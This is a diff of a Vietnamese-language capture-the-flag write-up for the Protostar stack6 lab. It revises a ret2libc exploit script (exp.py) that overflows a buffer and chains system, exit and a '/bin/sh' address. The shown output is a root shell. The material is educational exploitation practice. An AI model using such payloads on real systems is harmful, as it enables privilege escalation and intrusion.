@@ -119,7 +119,7 @@ input path please: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOP
 got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 
 Program received signal SIGSEGV, Segmentation fault.
-0x55555555 in ?? ()       <-- 'TTTT'    76 ký tự
+0x55555555 in ?? ()       <-- 'TTTT'    [80 ký tự][EIP]
 (gdb)
 ```
 
@@ -150,15 +150,15 @@ root@protostar:/opt/protostar/bin# strings -tx /lib/libc-2.11.2.so | grep /bin/s
  0xb7fb63bf = 0xb7e97000 + 0x11f3bf
 ```
 
-Payload của chúng ta bây giờ là 
+Payload của chúng ta bây giờ là:
 
-`payload = "A" * 76 + addr_system + addr_exit + addr_shellcode`
+`payload = "A" * 80 + addr_system + addr_exit + addr_shellcode`
 
-File exp.py
+File exp.py.
 
 ```
 import struct
-pd = "A" * 76
+pd = "A" * 80
 sysadd = struct.pack("I", 0xb7ecffb0)
 exitadd = struct.pack("I", 0xb7ec60c0)
 binadd = struct.pack("I", 0xb7fb63bf)
@@ -170,7 +170,7 @@ Done!
 
 ```
 root@protostar:/opt/protostar/bin$ (python exp.py; cat) | ./stack6
-input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����`췿c��
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`췿c
 id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 whoami
